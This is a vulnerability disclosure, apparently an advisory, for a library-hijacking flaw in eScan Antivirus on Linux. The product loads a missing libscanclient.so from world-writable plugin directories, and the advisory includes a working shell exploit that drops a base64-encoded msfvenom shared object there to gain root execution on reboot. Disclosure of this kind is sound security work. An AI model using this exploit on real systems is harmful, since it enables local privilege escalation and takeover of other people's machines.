# Description and impact
Escan Antivirus's engine loads `libscanclient.so` which is writable by any unprivileged user. This vulnerability leads to any unprivileged user can hijack library, execute malicious code as privileged user.

# Root-cause
Escan Antivirus tried loading libscanclient.so (which doesn't exist) by default. Full path is `/opt/MicroWorld/var/bdplugins2/libscanclient.so` for the CLI scanner and `/opt/MicroWorld/var/bdplugins1/libscanclient.so` for GUI.

![image](https://github.com/user-attachments/assets/dc7bd63d-fdfd-49d7-97d2-196ffd97b298)

![image](https://github.com/user-attachments/assets/49617aae-af1a-4986-b1f2-99b742541de0)

Both folders are writable by any unprivileged user

![image](https://github.com/user-attachments/assets/886e1402-8f45-4412-8db2-396c842eedbf)

Malicious code will be executed when:
1. Any user runs malware scan from Escan. Malicious code will have privilege of user that runs Escan
2. System reboot. Malicious code will have root's privilege

# Steps to reprocedure
1. Attacker uses this exploit script to hijack library
```
#!/bin/sh

# msfvenom -f elf-so -p linux/x64/exec CMD="id > /tmp/mal_id" -o hehe.so

mal_file="f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAACAEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxwEAAAAAAAD8AQAAAAAAAAAQAAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAAAAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAAAACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASLgvYmluL3NoAJlQVF9SZmgtY1ReUugRAAAAaWQgPiAvdG1wL21hbF9pZABWV1ReajtYDwU="

# plugin1 -> used by Gui, plugin2 -> used by cli
write_path="/opt/MicroWorld/var/bdplugins2/libscanclient.so"
write_path_2="/opt/MicroWorld/var/bdplugins1/libscanclient.so"

echo $mal_file | base64 -d > $write_path
echo $mal_file | base64 -d > $write_path_2
```

2. Reboot system. Malicious code will be triggered as root
![image](https://github.com/user-attachments/assets/6184ccba-7711-477b-934b-906c57e04d7b)
